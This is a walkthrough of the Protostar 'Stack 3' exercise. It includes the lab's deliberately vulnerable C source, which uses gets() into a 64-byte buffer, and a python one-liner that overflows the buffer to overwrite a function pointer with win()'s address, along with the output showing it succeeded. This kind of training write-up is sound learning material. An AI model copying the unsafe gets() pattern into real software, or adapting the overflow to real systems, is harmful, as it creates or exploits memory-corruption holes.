
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 3   =-=-=-=-=




1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 

	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	void win()
	{
	  printf("code flow successfully changed\n");
	}

	int main(int argc, char **argv)
	{
	  volatile int (*fp)();
	  char buffer[64];

	  fp = 0;

	  gets(buffer);

	  if(fp) {
	      printf("calling function pointer, jumping to 0x%08x\n", fp);
	      fp();
	  }
	}


3.	In this challenge we need to overflow the buffer, such that it overwrites the function 
	pointer with the adress of 'win()'. We can find function address by many ways (by GNU
	gdb, objdump or nm).	



4. 	First we find the address of win() by 'nm'.
		
		$ cd /opt/protostar/bin
		$ nm stack3
		.
		.
		.
		08048424 T win


5.	Now, we pipe a python script output to the 'stack3' binary.
	
		$ python -c 'print "\x41"*64 + "\x24\x84\x04\x08"' | stack3
		calling function pointer, jumping to 0x08048424
		code flow successfully changed

	NOTE: The address to provide must be in little-endian byte order (since intel machines
		  are little endian). The '|' here is a pipe symbol connects python script's o/p 
		  to input of 'stack3' (basically used to connect STDOUT of one process to STDIN
		  of another process).


	Cheers,	  
